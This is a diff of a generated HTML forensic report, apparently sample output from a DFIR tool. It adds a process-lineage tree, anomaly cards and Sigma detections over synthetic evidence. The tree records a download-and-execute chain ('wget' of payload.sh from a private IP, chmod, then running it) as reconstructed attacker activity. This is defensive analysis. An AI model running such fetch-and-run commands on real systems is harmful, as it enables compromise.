@@ -469,10 +469,54 @@
       transition: all 0.2s ease;
     }
 
-    .btn-copy:hover {
-      color: #ffffff;
-      border-color: var(--accent-blue);
-      background: #0284c7;
+    /* Tactical Process Tree Lineage */
+    .tree-container {
+      background: #080c14;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      padding: 1.2rem;
+      font-family: ui-monospace, SFMono-Regular, "Cascadia Code", Menlo, monospace;
+      font-size: 0.82rem;
+      line-height: 1.6;
+      color: #cbd5e1;
+      overflow-x: auto;
+    }
+    .tree-node-line {
+      margin: 4px 0;
+      white-space: pre;
+    }
+    .tree-node-alert {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid var(--accent-crimson);
+      color: #fca5a5;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.75rem;
+      font-weight: bold;
+      margin-left: 6px;
+    }
+
+    /* Anomaly Spotlight Cards */
+    .anomaly-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 1.1rem;
+      margin-top: 1rem;
+    }
+    .anomaly-card {
+      background: #0d121d;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      padding: 1.1rem;
+    }
+    .anomaly-card.critical {
+      border-left: 4px solid var(--accent-crimson);
+    }
+    .anomaly-card.high {
+      border-left: 4px solid var(--accent-amber);
+    }
+    .anomaly-card.medium {
+      border-left: 4px solid var(--accent-blue);
     }
   </style>
 </head>
@@ -622,7 +666,7 @@
               <td>
                 
                 <span class="badge badge-tsa" title="https://freetsa.org/tsr">
-                  ⏱️ VERIFIED_RFC3161 (TSA-F613DCDC04928449)
+                  ⏱️ VERIFIED_RFC3161 (TSA-D68D927E0319754F)
                 </span>
                 
               </td>
@@ -640,7 +684,7 @@
               <td>
                 
                 <span class="badge badge-tsa" title="https://freetsa.org/tsr">
-                  ⏱️ VERIFIED_RFC3161 (TSA-E6EB7F9FC336DAD1)
+                  ⏱️ VERIFIED_RFC3161 (TSA-E142B2526BDA6DE4)
                 </span>
                 
               </td>
@@ -652,13 +696,13 @@
               <td><span class="badge badge-pass">RAW</span></td>
               <td>317 B</td>
               <td>
-                <code>80de3b672cc53b95...9d296803</code>
-                <button class="btn-copy" onclick="navigator.clipboard.writeText('80de3b672cc53b95e70cce5448baea5847bfd0858d064010534073169d296803'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+                <code>20d3a642704a96af...158c2d7f</code>
+                <button class="btn-copy" onclick="navigator.clipboard.writeText('20d3a642704a96afe13659bd6cbd6c23a5e0035d643ece9cd2914dde158c2d7f'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
               </td>
               <td>
                 
                 <span class="badge badge-tsa" title="https://freetsa.org/tsr">
-                  ⏱️ VERIFIED_RFC3161 (TSA-67AB111EA8527F64)
+                  ⏱️ VERIFIED_RFC3161 (TSA-BA1102D772192887)
                 </span>
                 
               </td>
@@ -676,7 +720,7 @@
               <td>
                 
                 <span class="badge badge-tsa" title="https://freetsa.org/tsr">
-                  ⏱️ VERIFIED_RFC3161 (TSA-4E446888E972BA22)
+                  ⏱️ VERIFIED_RFC3161 (TSA-E97A82101A23EEDF)
                 </span>
                 
               </td>
@@ -688,13 +732,13 @@
               <td><span class="badge badge-pass">RAW</span></td>
               <td>813 B</td>
               <td>
-                <code>c280f521b6b2e742...429876ba</code>
-                <button class="btn-copy" onclick="navigator.clipboard.writeText('c280f521b6b2e7422ee9ae0f44938c2f63fa24d5b244c76206206008429876ba'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+                <code>2cd52c328126cbce...98b1cca1</code>
+                <button class="btn-copy" onclick="navigator.clipboard.writeText('2cd52c328126cbce12337a0f94ae1f9037b63ec6f7f6118f9b13fe2198b1cca1'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
               </td>
               <td>
                 
                 <span class="badge badge-tsa" title="https://freetsa.org/tsr">
-                  ⏱️ VERIFIED_RFC3161 (TSA-5002BD8BAA662878)
+                  ⏱️ VERIFIED_RFC3161 (TSA-ADCA40013997F321)
                 </span>
                 
               </td>
@@ -712,7 +756,7 @@
               <td>
                 
                 <span class="badge badge-tsa" title="https://freetsa.org/tsr">
-                  ⏱️ VERIFIED_RFC3161 (TSA-89123BF063609487)
+                  ⏱️ VERIFIED_RFC3161 (TSA-3B8AFC25DD6D337D)
                 </span>
                 
               </td>
@@ -770,7 +814,7 @@
               <td><span class="badge badge-danger">MEDIUM</span></td>
               <td><code>investigation_memo.docx</code></td>
               <td><code>MODIFIED_PRE_CREATION</code></td>
-              <td>Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:27:15.114128+00:00</td>
+              <td>Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T20:05:47.522842+00:00</td>
             </tr>
             
           </tbody>
@@ -779,6 +823,136 @@
       
 
       
+    </div>
+  </div>
+  
+
+  <!-- Process Execution Lineage Tree (Attack Chain Visualizer) -->
+  
+  <div class="ui-card">
+    <div class="ui-card-header">
+      <h2>🌲 Process Lineage Tree &amp; Attack Chain Visualizer</h2>
+      <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 700;">
+        PPID &rarr; PID Hierarchical Execution Graph
+      </span>
+    </div>
+    <div class="ui-card-body">
+      <p style="color: var(--text-muted); margin-top: 0; margin-bottom: 1rem;">
+        Reconstructed parent-to-child process executions revealing execution vectors, LOLBin misuse, and suspicious process spawning:
+      </p>
+      <div class="tree-container">
+        
+        <div class="tree-node-line">
+          <strong>payload.sh</strong> (PID: PID-1000) [UNKNOWN] &mdash; <code>wget http://192.168.1.200/payload.sh</code>
+          
+        </div>
+        
+        
+        <div class="tree-node-line">
+          <strong>chmod</strong> (PID: PID-1001) [UNKNOWN] &mdash; <code>chmod +x payload.sh</code>
+          
+        </div>
+        
+        
+        <div class="tree-node-line">
+          <strong>cmd.exe</strong> (PID: PID-1002) [admin] &mdash; <code>cmd.exe</code>
+          
+        </div>
+        
+        
+        <div class="tree-node-line">
+          <strong>payload.sh</strong> (PID: PID-1003) [UNKNOWN] &mdash; <code>./payload.sh</code>
+          
+        </div>
+        
+        
+      </div>
+    </div>
+  </div>
+  
+
+  <!-- Statistical Anomaly Spotlight -->
+  
+  <div class="ui-card">
+    <div class="ui-card-header">
+      <h2>⚡ Statistical &amp; Off-Hours Anomaly Spotlight</h2>
+      <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 700;">
+        Rolling Z-Score &amp; Ransomware Pattern Detection
+      </span>
+    </div>
+    <div class="ui-card-body">
+      <p style="color: var(--text-muted); margin-top: 0;">
+        Automated baseline deviation detection identifying volume spikes, off-hours administrative sessions, and rapid file modification loops:
+      </p>
+      <div class="anomaly-grid">
+        
+        <div class="anomaly-card medium">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.6rem;">
+            <span class="badge badge-pass">MEDIUM</span>
+            <code style="font-size: 0.75rem;">Z-Score: 2.18</code>
+          </div>
+          <h4 style="color: #ffffff; margin: 0 0 0.5rem 0;">Activity Volume Spike (12 events in 15m)</h4>
+          <p style="color: var(--text-muted); font-size: 0.82rem; margin: 0 0 0.8rem 0;">Statistical burst detected with Z-score 2.18. Event count (12) is significantly higher than baseline mean (3.5 +/- 3.9).</p>
+          <div style="font-size: 0.78rem; color: var(--text-dim);">
+            <div><strong>Window:</strong> <code>2026-10-05T20:00:00+00:00</code></div>
+            <div><strong>Users:</strong> UNKNOWN</div>
+          </div>
+        </div>
+        
+        <div class="anomaly-card high">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.6rem;">
+            <span class="badge badge-warn">HIGH</span>
+            <code style="font-size: 0.75rem;">Z-Score: 3.0</code>
+          </div>
+          <h4 style="color: #ffffff; margin: 0 0 0.5rem 0;">Unusual Logon: admin (off-hours logon (02:00 UTC))</h4>
+          <p style="color: var(--text-muted); font-size: 0.82rem; margin: 0 0 0.8rem 0;">User 'admin' authenticated during atypical operational window (off-hours logon (02:00 UTC)). Action: AUTH_LOGIN on target: None.</p>
+          <div style="font-size: 0.78rem; color: var(--text-dim);">
+            <div><strong>Window:</strong> <code>2024-03-11T02:14:07+00:00</code></div>
+            <div><strong>Users:</strong> admin</div>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+  </div>
+  
+
+  <!-- Sigma Rule Detections -->
+  
+  <div class="ui-card">
+    <div class="ui-card-header">
+      <h2>📜 Sigma Rule Detections</h2>
+      <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 700;">
+        DFIR Industry-Standard Threat Signatures
+      </span>
+    </div>
+    <div class="ui-card-body">
+      <div class="table-container">
+        <table>
+          <thead>
+            <tr>
+              <th>Level</th>
+              <th>Rule Title</th>
+              <th>Rule ID</th>
+              <th>MITRE ATT&amp;CK</th>
+              <th>Event ID</th>
+              <th>Timestamp (UTC)</th>
+            </tr>
+          </thead>
+          <tbody>
+            
+            <tr>
+              <td><span class="badge badge-danger">CRITICAL</span></td>
+              <td><strong style="color: #ffffff;">Windows Security Event Log Cleared (Anti-Forensics)</strong></td>
+              <td><code>sigma-log-005</code></td>
+              <td><code>attack.defense_evasion, attack.t1070.001</code></td>
+              <td><code>f1a9c869-8dff-5f41-b867-78e4f450dec2</code></td>
+              <td><code>2024-03-11T02:20:00+00:00</code></td>
+            </tr>
+            
+          </tbody>
+        </table>
+      </div>
     </div>
   </div>
   
@@ -917,7 +1091,7 @@
                 OOXML dcterms:modified metadata
                 
                 <div style="color: var(--accent-crimson); font-size: 0.8rem; margin-top: 0.25rem; font-weight: 700;">
-                  ⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:27:15.114128+00:00
+                  ⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T20:05:47.522842+00:00
                 </div>
                 
               </td>
@@ -1144,7 +1318,7 @@
             </tr>
             
             <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/auth.log" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.760665+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.474778+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
@@ -1166,7 +1340,7 @@
             </tr>
             
             <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/bash_history" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.767165+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.479778+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
@@ -1188,7 +1362,7 @@
             </tr>
             
             <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/Security_Events.jsonl" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.772172+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.484778+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
@@ -1210,7 +1384,7 @@
             </tr>
             
             <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/History" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.807667+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.512279+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
@@ -1232,7 +1406,7 @@
             </tr>
             
             <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/investigation_memo.docx" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.825670+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.526046+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
@@ -1254,7 +1428,7 @@
             </tr>
             
             <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.837677+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.539087+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
@@ -1276,7 +1450,7 @@
             </tr>
             
             <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/auth.log" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:10.957324+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.652646+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_CREATE
@@ -1298,7 +1472,7 @@
             </tr>
             
             <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/bash_history" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:12.049167+00:00</code></td>
+              <td><code>2026-10-05T20:05:44.774879+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_CREATE
@@ -1320,7 +1494,7 @@
             </tr>
             
             <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/exfiltrated_files.zip" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:13.197821+00:00</code></td>
+              <td><code>2026-10-05T20:05:45.670620+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_CREATE
@@ -1342,7 +1516,7 @@
             </tr>
             
             <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/History" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:14.169180+00:00</code></td>
+              <td><code>2026-10-05T20:05:46.613605+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_CREATE
@@ -1364,7 +1538,7 @@
             </tr>
             
             <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/investigation_memo.docx" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:15.114128+00:00</code></td>
+              <td><code>2026-10-05T20:05:47.522842+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_CREATE
@@ -1386,7 +1560,7 @@
             </tr>
             
             <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/Security_Events.jsonl" data-user="UNKNOWN" data-plugin="filesystem:stat">
-              <td><code>2026-10-05T19:27:16.059479+00:00</code></td>
+              <td><code>2026-10-05T20:05:48.469385+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_CREATE
@@ -1407,15 +1581,15 @@
               </td>
             </tr>
             
-            <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip::financial_report.pdf" data-user="UNKNOWN" data-plugin="zip:entry_central_dir">
-              <td><code>2026-10-06T00:57:10+00:00</code></td>
+            <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip::passwords.txt" data-user="UNKNOWN" data-plugin="zip:entry_central_dir">
+              <td><code>2026-10-06T01:35:42+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
                 </span>
               </td>
               <td><strong style="color: #ffffff;">UNKNOWN</strong></td>
-              <td><code>evidence/exfiltrated_files.zip::financial_report.pdf</code></td>
+              <td><code>evidence/exfiltrated_files.zip::passwords.txt</code></td>
               <td><span class="badge badge-pass">zip:entry_central_dir</span></td>
               <td>
                 
@@ -1429,15 +1603,15 @@
               </td>
             </tr>
             
-            <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip::passwords.txt" data-user="UNKNOWN" data-plugin="zip:entry_central_dir">
-              <td><code>2026-10-06T00:57:10+00:00</code></td>
+            <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip::financial_report.pdf" data-user="UNKNOWN" data-plugin="zip:entry_central_dir">
+              <td><code>2026-10-06T01:35:42+00:00</code></td>
               <td>
                 <span class="badge badge-pass">
                   FILE_WRITE
                 </span>
               </td>
               <td><strong style="color: #ffffff;">UNKNOWN</strong></td>
-              <td><code>evidence/exfiltrated_files.zip::passwords.txt</code></td>
+              <td><code>evidence/exfiltrated_files.zip::financial_report.pdf</code></td>
               <td><span class="badge badge-pass">zip:entry_central_dir</span></td>
               <td>
                 
@@ -1471,11 +1645,11 @@
         </div>
         <div class="kpi-card cyan">
           <div class="kpi-label">Merkle Root Digest</div>
-          <div class="kpi-value"><code style="font-size: 1rem;">1c73170a7c9f65f5f96cf394ce625e7a5ae869079c95f30736c6de3ab77d52ff</code></div>
+          <div class="kpi-value"><code style="font-size: 1rem;">1f391b61693c7b2b09351f374b6d5df4ace8b03f1b34d866e1d76000262cf4f6</code></div>
         </div>
         <div class="kpi-card purple">
           <div class="kpi-label">Ledger Entries Replayed</div>
-          <div class="kpi-value">12</div>
+          <div class="kpi-value">15</div>
         </div>
       </div>
     </div>
@@ -1502,98 +1676,122 @@
             
             <tr>
               <td><code>#1</code></td>
-              <td><code>2026-10-05T19:27:10.848713+00:00</code></td>
+              <td><code>2026-10-05T20:05:43.552552+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">case_created</span></td>
-              <td><code>e9da1e58d301df32...b22af293</code></td>
+              <td><code>b0f6f15e46ecf598...aab8e0a6</code></td>
             </tr>
             
             <tr>
               <td><code>#2</code></td>
-              <td><code>2026-10-05T19:27:12.037723+00:00</code></td>
+              <td><code>2026-10-05T20:05:44.758483+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">evidence_acquired</span></td>
-              <td><code>6b06238de2c16b8b...623ff7e6</code></td>
+              <td><code>80d41de578c8e0d6...a7e848b8</code></td>
             </tr>
             
             <tr>
               <td><code>#3</code></td>
-              <td><code>2026-10-05T19:27:13.178911+00:00</code></td>
+              <td><code>2026-10-05T20:05:45.657539+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">evidence_acquired</span></td>
-              <td><code>6d6b94acfd7f9d80...41e13f28</code></td>
+              <td><code>2aaffeaf70a18df3...a5325cae</code></td>
             </tr>
             
             <tr>
               <td><code>#4</code></td>
-              <td><code>2026-10-05T19:27:14.150276+00:00</code></td>
+              <td><code>2026-10-05T20:05:46.592511+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">evidence_acquired</span></td>
-              <td><code>15db05f378f20bb9...3cdec642</code></td>
+              <td><code>56e2b0237c015721...fbac6d0e</code></td>
             </tr>
             
             <tr>
               <td><code>#5</code></td>
-              <td><code>2026-10-05T19:27:15.094802+00:00</code></td>
+              <td><code>2026-10-05T20:05:47.503661+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">evidence_acquired</span></td>
-              <td><code>5551e82c41788169...f2b80a36</code></td>
+              <td><code>01454161025e0e99...e02166c5</code></td>
             </tr>
             
             <tr>
               <td><code>#6</code></td>
-              <td><code>2026-10-05T19:27:16.040217+00:00</code></td>
+              <td><code>2026-10-05T20:05:48.447329+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">evidence_acquired</span></td>
-              <td><code>d7912ddbd923ab7a...6641ac08</code></td>
+              <td><code>2268f1ab0b13bb50...0929fe25</code></td>
             </tr>
             
             <tr>
               <td><code>#7</code></td>
-              <td><code>2026-10-05T19:27:16.952933+00:00</code></td>
+              <td><code>2026-10-05T20:05:49.347514+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">evidence_acquired</span></td>
-              <td><code>7201f494b9aa9ff1...e7fccf7d</code></td>
+              <td><code>75d81f6e6afff885...18de0921</code></td>
             </tr>
             
             <tr>
               <td><code>#8</code></td>
-              <td><code>2026-10-05T19:27:17.093957+00:00</code></td>
+              <td><code>2026-10-05T20:05:49.463608+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">artefacts_extracted</span></td>
-              <td><code>d664784a31ce8161...8d40e98a</code></td>
+              <td><code>4ae9c6b0fe46c135...15fc156d</code></td>
             </tr>
             
             <tr>
               <td><code>#9</code></td>
-              <td><code>2026-10-05T19:27:17.310043+00:00</code></td>
+              <td><code>2026-10-05T20:05:49.711219+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">cross_source_corroborated</span></td>
-              <td><code>5b52bd73d6141ed6...e6d845cb</code></td>
+              <td><code>f741eadec7adcf8d...121f6f55</code></td>
             </tr>
             
             <tr>
               <td><code>#10</code></td>
-              <td><code>2026-10-05T19:27:17.338006+00:00</code></td>
+              <td><code>2026-10-05T20:05:49.734657+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">threat_rules_scanned</span></td>
-              <td><code>a79a964ada0bb539...b4096d5c</code></td>
+              <td><code>c49dc25ba4f16c4b...f5e9ae86</code></td>
             </tr>
             
             <tr>
               <td><code>#11</code></td>
-              <td><code>2026-10-05T19:27:17.982856+00:00</code></td>
+              <td><code>2026-10-05T20:05:50.428396+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">timeline_built</span></td>
-              <td><code>1033948aa21642ce...787ba5cd</code></td>
+              <td><code>e46a48b5a72658c3...96d2b515</code></td>
             </tr>
             
             <tr>
               <td><code>#12</code></td>
-              <td><code>2026-10-05T19:27:18.114371+00:00</code></td>
+              <td><code>2026-10-05T20:05:50.486584+00:00</code></td>
+              <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
+              <td><span class="badge badge-pass">process_lineage_reconstructed</span></td>
+              <td><code>70a408a69b9ebb1f...2d24bb2d</code></td>
+            </tr>
+            
+            <tr>
+              <td><code>#13</code></td>
+              <td><code>2026-10-05T20:05:50.539536+00:00</code></td>
+              <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
+              <td><span class="badge badge-pass">anomalies_detected</span></td>
+              <td><code>19fce83b1ae546c5...08746263</code></td>
+            </tr>
+            
+            <tr>
+              <td><code>#14</code></td>
+              <td><code>2026-10-05T20:05:50.584182+00:00</code></td>
+              <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
+              <td><span class="badge badge-pass">sigma_rules_evaluated</span></td>
+              <td><code>bd29d1c1349f7b89...c2ac7f4b</code></td>
+            </tr>
+            
+            <tr>
+              <td><code>#15</code></td>
+              <td><code>2026-10-05T20:05:50.709632+00:00</code></td>
               <td><strong style="color: #ffffff;">Alex Mercer (Senior Forensics Examiner)</strong></td>
               <td><span class="badge badge-pass">integrity_verified</span></td>
-              <td><code>5a3603fbadb82c3e...70ec70db</code></td>
+              <td><code>1cb02e271d2df1e1...6d204dee</code></td>
             </tr>
             
           </tbody>
